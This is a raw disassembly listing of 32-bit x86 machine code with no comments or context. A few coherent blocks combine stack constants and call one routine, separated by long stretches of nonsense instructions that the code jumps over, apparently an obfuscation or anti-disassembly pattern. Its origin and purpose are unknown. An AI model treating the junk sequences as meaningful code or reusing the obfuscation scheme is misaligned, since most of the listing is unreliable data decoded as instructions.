  418583:	cmp    ebx,edx
  418585:	je     0x41a937
  41858b:	mov    DWORD PTR [esp+0x30],0x71ba
  418593:	mov    DWORD PTR [esp+0x34],0x5f78
  41859b:	mov    DWORD PTR [esp+0x10],0x7b9c
  4185a3:	mov    DWORD PTR [esp+0x14],0x5622
  4185ab:	mov    eax,DWORD PTR [esp+0x10]
  4185af:	mov    ecx,DWORD PTR [esp+0x14]
  4185b3:	mov    edx,DWORD PTR [esp+0x30]
  4185b7:	mov    ebx,DWORD PTR [esp+0x34]
  4185bb:	jmp    0x418818
  4185c0:	inc    edi
  4185c1:	pop    ebp
  4185c2:	sti    
  4185c3:	daa    
  4185c4:	sti    
  4185c5:	mov    ebx,0x271b9d9b
  4185ca:	mov    esp,0x7814fda4
  4185cf:	xchg   edx,eax
  4185d0:	fsub   st(7),st
  4185d2:	sar    BYTE PTR [esi-0x41413dcb],0x17
  4185d9:	and    ebx,DWORD PTR [ebp-0x31b74f26]
  4185df:	loop   0x418569
  4185e1:	dec    ecx
  4185e2:	lock or al,0x19
  4185e5:	(bad)  [eax+edi*1]
  4185e8:	scas   eax,DWORD PTR es:[edi]
  4185e9:	bound  ecx,QWORD PTR [ebx-0x1b]
  4185ec:	aas    
  4185ed:	cmp    eax,0x5e41b3c2
  4185f2:	test   BYTE PTR [edx-0x76],bh
  4185f5:	push   ss
  4185f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185f7:	shr    DWORD PTR [eax+0x12596085],cl
  4185fd:	loop   0x418618
  4185ff:	or     bh,BYTE PTR [edx+0x35857af2]
  418605:	js     0x41867d
  418607:	or     BYTE PTR [ebx-0x58],ch
  41860a:	imul   edx,DWORD PTR [esi],0x22
  41860d:	mov    ebx,0xd679d507
  418612:	add    al,0x99
  418614:	dec    edx
  418615:	sub    BYTE PTR [ebx+0x3f],ah
  418618:	vmaxss xmm5,xmm6,DWORD PTR [edx-0x2bede50e]
  418620:	xor    BYTE PTR ds:0xf25e6809,0x92
  418627:	adc    al,0xaf
  418629:	pop    esi
  41862a:	loope  0x4185b5
  41862c:	in     al,dx
  41862d:	ror    DWORD PTR [ebx+ebp*4-0x304e0d83],0x65
  418635:	add    al,0x81
  418637:	lahf   
  418638:	jmp    0xeaa:0xf574af97
  41863f:	dec    ecx
  418640:	sbb    ah,BYTE PTR [ecx+0x124849bd]
  418646:	xor    eax,0x18fe14e
  41864b:	add    ebx,ebx
  41864d:	sahf   
  41864e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41864f:	xchg   esi,eax
  418650:	jae    0x4186c4
  418652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418653:	push   cs
  418654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418655:	push   edx
  418656:	inc    edi
  418657:	adc    edx,DWORD PTR ds:[ecx+0x7c]
  41865b:	push   esi
  41865c:	pushf  
  41865d:	mov    ds:0x41fd5d09,eax
  418662:	jae    0x418653
  418664:	outs   dx,BYTE PTR ds:[esi]
  418665:	(bad)  
  418666:	aam    0x26
  418668:	loop   0x4186b1
  41866a:	imul   eax,DWORD PTR ds:0x6b38c8ad,0x348ca5b2
  418674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418675:	mov    edx,0x310c9df
  41867a:	inc    eax
  41867b:	jns    0x4186c8
  41867d:	sti    
  41867e:	adc    al,0x64
  418680:	jge    0x41862e
  418682:	cdq    
  418683:	js     0x418671
  418685:	pop    edx
  418686:	sub    dl,al
  418688:	sbb    BYTE PTR [ebx+0x73929083],cl
  41868e:	xchg   ebp,eax
  41868f:	sbb    ecx,edi
  418691:	xchg   ebp,eax
  418692:	jge    0x418699
  418694:	xchg   DWORD PTR [eax*4+0x1fca5741],esi
  41869b:	add    edi,esp
  41869d:	outs   dx,DWORD PTR ds:[esi]
  41869e:	ds pop ecx
  4186a0:	(bad)  
  4186a1:	mov    al,0x3e
  4186a3:	std    
  4186a4:	loope  0x418643
  4186a6:	jmp    0xf4ea:0x84bf1210
  4186ad:	lock dec ebx
  4186af:	sbb    DWORD PTR [ecx-0x614a63d6],ecx
  4186b5:	mov    al,ds:0x148a7c58
  4186ba:	xor    esi,DWORD PTR [ecx-0x625923eb]
  4186c0:	dec    edx
  4186c1:	(bad)  
  4186c2:	lock push es
  4186c4:	addr16 mov ecx,0x6986ec66
  4186ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186cb:	int    0xd1
  4186cd:	cld    
  4186ce:	xor    esp,edi
  4186d0:	mov    ds:0xa3bb6ea5,eax
  4186d5:	cmp    eax,0xae160038
  4186da:	jo     0x4186cd
  4186dc:	scas   al,BYTE PTR es:[edi]
  4186dd:	rcl    edi,0x2a
  4186e0:	sub    ch,BYTE PTR [eax]
  4186e2:	lahf   
  4186e3:	std    
  4186e4:	aaa    
  4186e5:	adc    bl,0x76
  4186e8:	mov    ebp,ecx
  4186ea:	(bad)  
  4186eb:	mov    ebp,0x46f67751
  4186f0:	pop    esi
  4186f1:	shl    bl,0x14
  4186f4:	push   edx
  4186f5:	jns    0x4186ff
  4186f7:	loope  0x41871e
  4186f9:	mov    ah,0xa6
  4186fb:	fcomp  DWORD PTR [eax+0x6d]
  4186fe:	out    dx,al
  4186ff:	xor    esp,edi
  418701:	sbb    DWORD PTR [esi+0x3d],0x1c5bc870
  418708:	add    al,0xb
  41870a:	and    cl,BYTE PTR [ecx]
  41870c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41870d:	std    
  41870e:	sbb    esp,ecx
  418710:	ror    BYTE PTR [ebp+0x6e1b1d5],cl
  418716:	leave  
  418717:	dec    ebp
  418718:	sub    ebx,DWORD PTR [eax+0x52]
  41871b:	sub    BYTE PTR [ecx+0x794e1062],al
  418721:	and    BYTE PTR [ebp-0x6a],0xea
  418725:	cld    
  418726:	scas   al,BYTE PTR es:[edi]
  418727:	push   ds
  418728:	dec    ebx
  418729:	mov    esi,db5
  41872c:	shl    BYTE PTR [esi-0x65d436f2],0xf6
  418733:	mov    eax,ds:0x9d5afbe0
  418738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418739:	inc    eax
  41873a:	(bad)  
  41873b:	push   eax
  41873c:	sub    bh,BYTE PTR fs:[ebp+ebp*1+0x3bf215bb]
  418744:	xor    eax,0xf413b35e
  418749:	jmp    0x446cbf37
  41874e:	cmc    
  41874f:	(bad)  
  418750:	iret   
  418751:	sbb    edx,esi
  418753:	xchg   esi,eax
  418754:	bound  eax,QWORD PTR [edx+0xd]
  418757:	(bad)  
  418758:	cli    
  418759:	lahf   
  41875a:	mov    eax,ds:0x60845a31
  41875f:	or     DWORD PTR [ebp-0x1f],esi
  418762:	jne    0x4187cb
  418764:	in     eax,dx
  418765:	push   eax
  418766:	jmp    0xccb22ad9
  41876b:	not    esp
  41876d:	xlat   BYTE PTR ds:[ebx]
  41876e:	cwde   
  41876f:	aas    
  418770:	(bad)  
  418771:	ja     0x418706
  418773:	pop    edi
  418774:	push   ss
  418775:	dec    esi
  418776:	imul   ebx,eax,0xfffffff3
  418779:	jg     0x41873d
  41877b:	repz iret 
  41877d:	inc    ecx
  41877e:	lods   al,BYTE PTR ds:[esi]
  41877f:	mov    BYTE PTR [ecx-0x15248e0b],cl
  418785:	mov    ecx,0x8ca16545
  41878a:	dec    ebx
  41878b:	dec    ecx
  41878c:	out    0xd3,al
  41878e:	sub    DWORD PTR [edx+0x9],esi
  418791:	mov    esp,0xc52325ea
  418796:	jge    0x418789
  418798:	out    dx,eax
  418799:	inc    esi
  41879a:	retf   
  41879b:	jp     0x418804
  41879d:	sub    ebx,edx
  41879f:	jae    0x41876a
  4187a1:	mov    dh,0xd1
  4187a3:	jp     0x4187e5
  4187a5:	leave  
  4187a6:	sti    
  4187a7:	das    
  4187a8:	arpl   WORD PTR [ebx+0x71],bp
  4187ab:	sar    DWORD PTR [eax],1
  4187ad:	outs   dx,BYTE PTR ds:[esi]
  4187ae:	popa   
  4187af:	and    ch,bl
  4187b1:	bound  esi,QWORD PTR [edx+0x2c]
  4187b4:	ds push ebx
  4187b6:	adc    BYTE PTR [edx],ah
  4187b8:	sub    dh,BYTE PTR [esp+esi*1-0x45]
  4187bc:	adc    ebx,DWORD PTR [edi-0x72]
  4187bf:	fmul   DWORD PTR [edi-0xa3b0f35]
  4187c5:	les    esi,FWORD PTR [esi-0x6a3ed5d9]
  4187cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187cc:	mov    ebp,0x9ca6b69e
  4187d1:	cs jb  0x418756
  4187d4:	ret    
  4187d5:	test   bh,bl
  4187d7:	sub    al,0xf
  4187d9:	jge    0x4187d7
  4187db:	in     eax,dx
  4187dc:	mov    WORD PTR [esi+ebx*8-0x6cc80bed],es
  4187e3:	pusha  
  4187e4:	dec    edi
  4187e5:	inc    ebp
  4187e6:	sti    
  4187e7:	data16 jae 0x4187d9
  4187ea:	ss lock cmp al,0x4d
  4187ee:	cmp    edx,DWORD PTR [ebx-0x14]
  4187f1:	retf   
  4187f2:	in     eax,dx
  4187f3:	mov    dl,0xe1
  4187f5:	jl     0x418792
  4187f7:	aam    0x68
  4187f9:	push   ecx
  4187fa:	inc    edx
  4187fb:	ss and esp,eax
  4187fe:	cwde   
  4187ff:	mov    ds:0xb232a9e2,eax
  418804:	ror    BYTE PTR [eax+0x7669da0f],0xf3
  41880b:	aas    
  41880c:	sub    esp,DWORD PTR [ebx+0xb]
  41880f:	cwde   
  418810:	pop    ecx
  418811:	or     edi,esp
  418813:	cwde   
  418814:	pop    ds
  418815:	test   BYTE PTR [edx+0x36460579],bl
  41881b:	add    BYTE PTR [eax],al
  41881d:	adc    ecx,0x7ace
  418823:	xor    eax,0x3e2e
  418828:	xor    ecx,0x4b71
  41882e:	and    eax,edx
  418830:	mov    DWORD PTR [esp+0x88],eax
  418837:	and    ecx,ebx
  418839:	mov    DWORD PTR [esp+0x8c],ecx
  418840:	mov    DWORD PTR [esp+0x50],0x18d6
  418848:	mov    DWORD PTR [esp+0x54],0x2bb4
  418850:	mov    DWORD PTR [esp+0x48],0x14
  418858:	mov    DWORD PTR [esp+0x4c],0x0
  418860:	mov    DWORD PTR [esp+0x30],0x1
  418868:	mov    DWORD PTR [esp+0x34],0x0
  418870:	mov    DWORD PTR [esp+0x10],0xa87
  418878:	mov    DWORD PTR [esp+0x14],0x7fd9
  418880:	jmp    0x418add
  418885:	mov    dh,0xe5
  418887:	jmp    0x836c:0xb814b913
  41888e:	adc    DWORD PTR [esi-0x7918a070],ebx
  418894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418895:	push   ebx
  418896:	repz sar BYTE PTR [esi-0x41413dcb],0x90
  41889e:	push   edx
  41889f:	in     eax,0x91
  4188a1:	dec    esi
  4188a2:	and    ecx,ecx
  4188a4:	dec    ecx
  4188a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188a7:	add    edi,ecx
  4188a9:	mov    ebp,0x869ea651
  4188ae:	bound  ebx,QWORD PTR [ecx]
  4188b0:	sbb    al,0x95
  4188b2:	dec    esi
  4188b3:	jae    0x4188df
  4188b5:	loopne 0x418934
  4188b7:	mov    dh,0xa
  4188b9:	xor    DWORD PTR [ebp-0x79],esi
  4188bc:	add    ecx,DWORD PTR [ebx]
  4188be:	gs xchg ecx,eax
  4188c0:	dec    ecx
  4188c1:	mov    ebx,0xbca7d155
  4188c6:	push   ds
  4188c7:	je     0x4188ec
  4188c9:	mov    ch,al
  4188cb:	data16 and al,0x6
  4188ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188cf:	adc    ebx,DWORD PTR [edx+0x15eaec4e]
  4188d5:	pop    ebp
  4188d6:	mov    edi,0xb00d14d7
  4188db:	mov    ch,0xc
  4188dd:	mov    eax,ds:0x29f27e00
  4188e2:	mov    ?,WORD PTR [ebp-0x1b7dc9a8]
  4188e8:	mov    cl,BYTE PTR [edx+ecx*8]
  4188eb:	cmp    al,0xff
  4188ed:	push   edx
  4188ee:	sub    BYTE PTR [esi-0x1b139c73],0xe6
  4188f5:	cmp    ecx,0x3e
  4188f8:	in     al,0xbf
  4188fa:	cmp    dl,BYTE PTR [ebx]
  4188fc:	add    cl,BYTE PTR [eax+edi*4]
  4188ff:	cli    
  418900:	int    0x99
  418902:	mov    ds:0x2fc53cf3,al
  418907:	push   ss
  418908:	pop    esi
  418909:	jmp    0x418898
  41890b:	push   ebp
  41890c:	cld    
  41890d:	ds mov edx,0x86c6c32
  418913:	mov    dl,BYTE PTR [ebx]
  418915:	inc    edi
  418916:	push   edx
  418917:	aam    0x8b
  418919:	in     eax,dx
  41891a:	fiadd  DWORD PTR [ecx+0x38]
  41891d:	or     dh,BYTE PTR [esi-0x7946cd2b]
  418923:	dec    ebx
  418924:	or     al,0x3c
  418926:	xor    edi,ebp
  418928:	sub    ecx,DWORD PTR [edi]
  41892a:	test   BYTE PTR [eax],0xd8
  41892d:	repz aam 0x95
  418930:	int3   
  418931:	fs call 0x6543:0xc9e8dc3d
  418939:	mov    bl,0x34
  41893b:	jns    0x418926
  41893d:	mov    esp,0x3bcaabb5
  418942:	add    al,0x79
  418944:	test   DWORD PTR [ebx+ebp*2],esi
  418947:	clc    
  418948:	daa    
  418949:	cs add eax,0x7b778abe
  41894f:	inc    esi
  418950:	mov    ds:0xa400284e,eax
  418955:	not    BYTE PTR [esi]
  418957:	arpl   WORD PTR [esi+0x7f],di
  41895a:	in     eax,0xbd
  41895c:	pop    esi
  41895d:	mov    ch,0x11
  41895f:	ds inc edi
  418961:	mov    eax,ds:0x9b59635c
  418966:	ficomp WORD PTR [eax]
  418968:	(bad)  
  418969:	dec    ecx
  41896a:	leave  
  41896b:	push   ss
  41896c:	into   
  41896d:	arpl   WORD PTR [ebx-0x36c9b795],bp
  418973:	test   DWORD PTR ds:[esi-0x64f757a1],eax
  41897a:	xchg   ebx,eax
  41897b:	call   0x73c09f3e
  418980:	ins    DWORD PTR es:[edi],dx
  418981:	sti    
  418982:	mov    WORD PTR es:[esi+0x43],fs
  418986:	aaa    
  418987:	inc    ebx
  418988:	mov    eax,0x1e1c5efb
  41898d:	inc    edx
  41898e:	sbb    al,BYTE PTR ds:0x7f0647f
  418994:	mov    dl,0xab
  418996:	xor    DWORD PTR [ebx+0x3664bb90],ebx
  41899c:	mov    ebp,eax
  41899e:	dec    ebx
  41899f:	mov    dh,0x5
  4189a1:	or     BYTE PTR [eax],ah
  4189a3:	push   0xb
  4189a5:	mov    cl,BYTE PTR ds:0xff3932d9
  4189ab:	or     BYTE PTR [esi],al
  4189ad:	dec    esi
  4189ae:	int    0x70
  4189b0:	push   ebx
  4189b1:	add    WORD PTR ds:0xbf17a6b9,0x2f83
  4189ba:	jmp    0x418a2e
  4189bc:	sahf   
  4189bd:	in     al,dx
  4189be:	test   al,0xbb
  4189c0:	mov    cl,0xa8
  4189c2:	xor    al,0x1e
  4189c4:	fsubr  DWORD PTR [edx]
  4189c6:	mov    al,0xb4
  4189c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189c9:	sub    ch,dl
  4189cb:	dec    edx
  4189cc:	retf   
  4189cd:	add    eax,0xdb5dcec
  4189d2:	aad    0x65
  4189d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189d5:	pop    esi
  4189d6:	add    al,al
  4189d8:	outs   dx,BYTE PTR ds:[esi]
  4189d9:	add    BYTE PTR [esi],al
  4189db:	arpl   WORD PTR [eax-0x4979519f],cx
  4189e1:	cmp    BYTE PTR [si],ah
  4189e4:	js     0x418a5d
  4189e6:	mov    esi,esp
  4189e8:	sub    DWORD PTR [ebx-0x314f3f02],ebx
  4189ee:	shr    eax,1
  4189f0:	ja     0x418a33
  4189f2:	enter  0x94ac,0x1c
  4189f6:	loope  0x4189ac
  4189f8:	adc    al,0x9d
  4189fa:	mov    eax,0xae44ac46
  4189ff:	rcl    BYTE PTR [eax],1
  418a01:	enter  0x442,0x3c
  418a05:	pop    esi
  418a06:	js     0x41898f
  418a08:	and    DWORD PTR [ecx+eax*2-0x66],ebp
  418a0c:	cli    
  418a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a0e:	call   0x9e46:0x7ef3c427
  418a15:	sub    al,0xa0
  418a17:	sar    edx,1
  418a19:	pop    edx
  418a1a:	inc    ecx
  418a1b:	or     ch,BYTE PTR [eax+0x1d]
  418a1e:	stos   BYTE PTR es:[edi],al
  418a1f:	mov    dh,cl
  418a21:	dec    eax
  418a22:	mov    bh,0x57
  418a24:	fisub  DWORD PTR [esi]
  418a26:	push   es
  418a27:	xchg   edi,eax
  418a28:	mov    esi,0x9b8bf608
  418a2d:	pop    eax
  418a2e:	cs lods eax,DWORD PTR es:[esi]
  418a31:	mov    BYTE PTR [ecx-0x26],dh
  418a34:	neg    BYTE PTR [ebp-0x40]
  418a37:	jge    0x4189d5
  418a39:	pop    ebx
  418a3a:	dec    esi
  418a3b:	xchg   DWORD PTR [edi-0x7c1577a2],ecx
  418a41:	or     DWORD PTR [edi+ebp*4],edx
  418a44:	int3   
  418a45:	mov    edi,0xbade5c0b
  418a4a:	jmp    0x8c62:0x3fc91985
  418a51:	push   ecx
  418a52:	inc    ebx
  418a53:	stos   BYTE PTR es:[edi],al
  418a54:	enter  0x3154,0x68
  418a58:	rcl    DWORD PTR [ecx+0x9337c81],cl
  418a5e:	ficom  WORD PTR [ebp-0x5d200939]
  418a64:	ss push esi
  418a66:	jo     0x418ad5
  418a68:	aaa    
  418a69:	pop    eax
  418a6a:	adc    BYTE PTR [eax-0xa],0x25
  418a6e:	adc    DWORD PTR [ebp+0x2f98ec84],ecx
  418a74:	cs xchg edi,eax
  418a76:	xchg   DWORD PTR [edx],esi
  418a78:	(bad)  
  418a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a7a:	push   eax
  418a7b:	repz jnp 0x418a14
  418a7e:	mov    ah,0xb4
  418a80:	das    
  418a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a82:	mov    cl,0xb8
  418a84:	xlat   BYTE PTR ds:[ebx]
  418a85:	pop    esi
  418a86:	and    dl,al
  418a88:	xor    ebp,DWORD PTR [esi]
  418a8a:	test   BYTE PTR [edx-0x3b09a346],dl
  418a90:	inc    ecx
  418a91:	rcr    DWORD PTR [eax-0x65],cl
  418a94:	cmc    
  418a95:	aas    
  418a96:	xchg   BYTE PTR [ecx-0x7c],bh
  418a99:	cwde   
  418a9a:	std    
  418a9b:	outs   dx,BYTE PTR ds:[esi]
  418a9c:	(bad)  
  418a9d:	out    dx,al
  418a9e:	aaa    
  418a9f:	aaa    
  418aa0:	in     eax,0xe0
  418aa2:	iret   
  418aa3:	and    ah,BYTE PTR [eax-0x48]
  418aa6:	or     bh,BYTE PTR [eax+0x4f93721f]
  418aac:	mov    ebp,0xf38141da
  418ab1:	iret   
  418ab2:	push   es
  418ab3:	or     ecx,DWORD PTR ss:0x5034c500
  418aba:	loop   0x418a5e
  418abc:	out    dx,eax
  418abd:	adc    BYTE PTR [esp+eiz*4-0x3f],0x5e
  418ac2:	add    al,0x67
  418ac4:	dec    ebx
  418ac5:	jo     0x418aab
  418ac7:	mov    ebx,0xc639361a
  418acc:	cmp    eax,DWORD PTR [ecx]
  418ace:	std    
  418acf:	push   ebx
  418ad0:	xchg   DWORD PTR [esi],ecx
  418ad2:	push   esi
  418ad3:	add    DWORD PTR ds:0x63d32274,esp
  418ad9:	dec    BYTE PTR [ebp+0x448b256f]
  418adf:	and    al,0x10
  418ae1:	mov    ecx,DWORD PTR [esp+0x14]
  418ae5:	push   0x2
  418ae7:	push   0x7f349462
  418aec:	xor    ecx,0x3601
  418af2:	xor    eax,0x5491
  418af7:	push   ecx
  418af8:	push   eax
  418af9:	call   0x4222a7
  418afe:	mov    ecx,DWORD PTR [esp+0x30]
  418b02:	mov    ebx,DWORD PTR [esp+0x34]
  418b06:	push   ebx
  418b07:	push   ecx
  418b08:	push   edx
  418b09:	push   eax
  418b0a:	call   0x4222a7
  418b0f:	mov    ecx,DWORD PTR [esp+0x48]
  418b13:	mov    ebx,DWORD PTR [esp+0x4c]
  418b17:	jmp    0x418d74
  418b1c:	jp     0x418ac4
  418b1e:	cld    
  418b1f:	dec    eax
  418b20:	cmp    al,0x9c
  418b22:	jp     0x418ae0
  418b24:	js     0x418b9b
  418b26:	push   esp
  418b27:	sahf   
  418b28:	add    al,0x42
  418b2a:	adc    bl,BYTE PTR [esi-0x413f0835]
  418b30:	xor    eax,0xffbebec2
  418b35:	out    0x18,eax
  418b37:	mov    esi,esi
  418b39:	mov    al,0x90
  418b3b:	mov    ebp,0xda399ac9
  418b40:	ins    BYTE PTR es:[edi],dx
  418b41:	or     BYTE PTR [esi],bh
  418b43:	mov    edi,0xb460a986
  418b48:	lods   eax,DWORD PTR ds:[esi]
  418b49:	into   
  418b4a:	jle    0x418b8c
  418b4c:	or     DWORD PTR [ecx],0xffffff97
  418b4f:	fwait
  418b50:	pop    esp
  418b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b52:	js     0x418b2f
  418b54:	rcl    dl,1
  418b56:	inc    edx
  418b57:	dec    ecx
  418b58:	mov    DWORD PTR [esi-0x1f59980e],edx
  418b5e:	aam    0x69
  418b60:	mov    ds:0x82d8b66b,eax
  418b65:	mov    bh,0xb5
  418b67:	popf   
  418b68:	inc    ecx
  418b69:	xchg   DWORD PTR [esi-0x5756fd4d],edi
  418b6f:	fisubr DWORD PTR [edx+ecx*8+0xa]
  418b73:	push   0xffffff95
  418b75:	arpl   WORD PTR [edi],sp
  418b77:	in     eax,dx
  418b78:	mov    edi,ebx
  418b7a:	ins    DWORD PTR es:[edi],dx
  418b7b:	adc    edi,ecx
  418b7d:	sub    ecx,eax
  418b7f:	push   0xaf8631c9
  418b84:	scas   eax,DWORD PTR es:[edi]
  418b85:	pop    ss
  418b86:	mov    edi,0x2f08ac71
  418b8b:	inc    ebp
  418b8c:	dec    esi
  418b8d:	sub    eax,0x35ef1ee4
  418b92:	mov    al,ds:0x232509e0
  418b97:	(bad)  
  418b98:	loop   0x418be2
  418b9a:	nop
  418b9b:	mov    fs,esp
  418b9d:	icebp  
  418b9e:	or     DWORD PTR ds:0x99f263f8,esp
  418ba4:	xchg   DWORD PTR ds:0x5d4ac22c,esi
  418baa:	mov    ds:0x3a10986d,al
  418baf:	cld    
  418bb0:	stc    
  418bb1:	call   0x1442:0x6a20f0f4
  418bb8:	daa    
  418bb9:	jne    0x418bfa
  418bbb:	fistp  DWORD PTR [edx]
  418bbd:	fidiv  WORD PTR [esi+0x61]
  418bc0:	xor    edx,DWORD PTR [edx-0x52cbb9e0]
  418bc6:	les    ebx,FWORD PTR [ebp-0x5b]
  418bc9:	mov    ds:0xa71fc1d1,al
  418bce:	ret    
  418bcf:	repz stc 
  418bd1:	push   eax
  418bd2:	sbb    bh,bl
  418bd4:	call   0x173f3f4e
  418bd9:	mov    eax,ds:0xd4a4ffc4
  418bde:	sbb    eax,0xdf771530
  418be3:	sbb    al,0x4c
  418be5:	arpl   bx,si
  418be7:	pushf  
  418be8:	lods   al,BYTE PTR ds:[esi]
  418be9:	xlat   BYTE PTR ds:[ebx]
  418bea:	inc    edi
  418beb:	or     DWORD PTR [edx+0x3e],ebp
  418bee:	js     0x418bcb
  418bf0:	push   cs
  418bf1:	jecxz  0x418c2a
  418bf3:	ja     0x418c74
  418bf5:	pop    edx
  418bf6:	dec    edx
  418bf7:	clc    
  418bf8:	xor    eax,DWORD PTR [edi-0x63]
  418bfb:	jp     0x418c1c
  418bfd:	or     edi,0xffffffa4
  418c00:	mov    ecx,0x95dfe3ac
  418c05:	push   cs
  418c06:	xchg   BYTE PTR [edx*2+0x7cee4403],dl
  418c0d:	(bad)  
  418c0f:	rol    esi,0x54
  418c12:	dec    edx
  418c13:	sar    BYTE PTR [eax],cl
  418c15:	in     eax,dx
  418c16:	xor    eax,0x14f6da1a
  418c1b:	add    dl,BYTE PTR [ecx+0x6f538e3f]
  418c21:	push   ss
  418c22:	sbb    eax,0x207564d7
  418c27:	adc    bh,BYTE PTR [ecx+esi*4]
  418c2a:	lds    esp,FWORD PTR [edx+ebp*4]
  418c2d:	pushf  
  418c2e:	outs   dx,BYTE PTR ds:[esi]
  418c2f:	cwde   
  418c30:	cli    
  418c31:	add    BYTE PTR [ecx],dl
  418c33:	jmp    0x4345:0x1faff16e
  418c3a:	or     BYTE PTR [ebx+0x94b91ed],cl
  418c40:	push   ebp
  418c41:	or     eax,0xd4b746cd
  418c46:	aam    0x89
  418c48:	jns    0x418c45
  418c4a:	xor    eax,DWORD PTR [edx-0x6a]
  418c4d:	push   esi
  418c4e:	inc    edx
  418c4f:	(bad)  [esi]
  418c51:	mov    eax,DWORD PTR [ecx+0x5e209275]
  418c57:	pusha  
  418c58:	int    0x2
  418c5a:	lods   eax,DWORD PTR ds:[esi]
  418c5b:	mov    bl,0x51
  418c5d:	mov    ah,BYTE PTR [edi+0x505a107a]
  418c63:	or     eax,DWORD PTR [ebp-0x45]
  418c66:	xchg   edx,eax
  418c67:	daa    
  418c68:	cmp    ebx,DWORD PTR [edx-0x1c]
  418c6b:	call   0xc4d4:0x25e5c96e
  418c72:	and    eax,0x9dbb453e
  418c77:	fmul   st(1),st
  418c79:	mov    ah,0xd
  418c7b:	sbb    DWORD PTR [eax+0x36],ebp
  418c7e:	push   0xffffffa7
  418c80:	retf   
  418c81:	fistp  DWORD PTR [edx-0x4]
  418c84:	das    
  418c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c86:	xchg   ecx,eax
  418c87:	push   es
  418c88:	add    bh,dh
  418c8a:	in     eax,dx
  418c8b:	add    DWORD PTR [ecx-0x6f89b0df],0x4a
  418c92:	outs   dx,BYTE PTR ds:[esi]
  418c93:	xor    ah,cl
  418c95:	sub    eax,0xbea3698a
  418c9a:	xor    BYTE PTR [eax],ch
  418c9c:	mov    eax,0x9c95d80e
  418ca1:	or     BYTE PTR [edx+0x78df21f5],dl
  418ca7:	sub    edi,DWORD PTR [edi-0x6f]
  418caa:	sub    al,0x0
  418cac:	lock cwde 
  418cae:	mov    dh,0x3b
  418cb0:	adc    eax,0x64fe264c
  418cb5:	out    dx,eax
  418cb6:	shl    ebx,1
  418cb8:	and    eax,0xe527db8d
  418cbd:	leave  
  418cbe:	aaa    
  418cbf:	sbb    eax,0x8aff9d9
  418cc4:	dec    eax
  418cc5:	scas   al,BYTE PTR es:[edi]
  418cc6:	sub    eax,0x709b6fc7
  418ccb:	jbe    0x418d01
  418ccd:	adc    esi,esi
  418ccf:	jmp    0x418d3b
  418cd1:	sub    ebp,DWORD PTR [esi]
  418cd3:	ins    DWORD PTR es:[edi],dx
  418cd4:	sbb    DWORD PTR [ebx],esp
  418cd6:	xchg   edx,eax
  418cd7:	mov    ebx,0xa6de0bd1
  418cdc:	lods   eax,DWORD PTR ds:[esi]
  418cdd:	rcr    BYTE PTR [eax+ecx*8-0x1231b911],cl
  418ce4:	jp     0x418d61
  418ce6:	dec    esi
  418ce7:	ins    BYTE PTR es:[edi],dx
  418ce8:	std    
  418ce9:	jmp    0x418cfa
  418ceb:	sbb    eax,0x97199283
  418cf0:	lahf   
  418cf1:	lods   eax,DWORD PTR ds:[esi]
  418cf2:	(bad)  
  418cf4:	or     cl,BYTE PTR [edx+0xf]
  418cf7:	sub    DWORD PTR [ebx+0x38845b50],esp
  418cfd:	js     0x418cd2
  418cff:	push   0xffffffd4
  418d01:	ins    BYTE PTR es:[edi],dx
  418d02:	ins    BYTE PTR es:[edi],dx
  418d03:	sub    al,0xd7
  418d05:	stos   BYTE PTR es:[edi],al
  418d06:	dec    ebp
  418d07:	test   BYTE PTR [ebp-0x14],al
  418d0a:	add    eax,0x76710578
  418d0f:	xchg   esi,eax
  418d10:	push   ebp
  418d11:	test   BYTE PTR [edi],al
  418d13:	mov    esi,0x2bdf8c84
  418d18:	mov    ah,0x6d
  418d1a:	adc    BYTE PTR [edx],bl
  418d1c:	sbb    BYTE PTR [ebx-0x42aecfe6],0xab
  418d23:	mov    eax,0xbc8d3bfd
  418d28:	out    0x72,eax
  418d2a:	cmp    al,0x0
  418d2c:	div    esi
  418d2e:	xor    BYTE PTR ds:0x98ba85b2,bh
  418d34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d35:	dec    edx
  418d36:	jg     0x418d7e
  418d38:	dec    esi
  418d39:	jbe    0x418d6e
  418d3b:	jmp    0xe2b729ef
  418d40:	adc    ebp,ebx
  418d42:	xlat   BYTE PTR ds:[ebx]
  418d43:	repnz push ecx
  418d45:	add    DWORD PTR [ecx+0x4a499d39],ecx
  418d4b:	pop    ss
  418d4c:	add    BYTE PTR [esi+0x33],bh
  418d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d50:	xchg   edx,eax
  418d51:	or     eax,0xa0e3c88e
  418d56:	loopne 0x418d3b
  418d58:	fwait
  418d59:	jg     0x418d7f
  418d5b:	rol    DWORD PTR [esi-0x2f9ce448],0x1f
  418d62:	sub    dl,dh
  418d64:	repnz pop es
  418d66:	ret    0xd57b
  418d69:	inc    ebx
  418d6a:	lea    esi,[ecx+0x1769e887]
  418d70:	xchg   DWORD PTR [eax+0x62],edx
  418d73:	fs push ebx
  418d75:	push   ecx
  418d76:	push   edx
  418d77:	push   eax
  418d78:	call   0x4222a7
  418d7d:	mov    ecx,DWORD PTR [esp+0x50]
  418d81:	mov    ebx,DWORD PTR [esp+0x54]
  418d85:	add    eax,ecx
  418d87:	mov    ecx,DWORD PTR [esp+0x88]
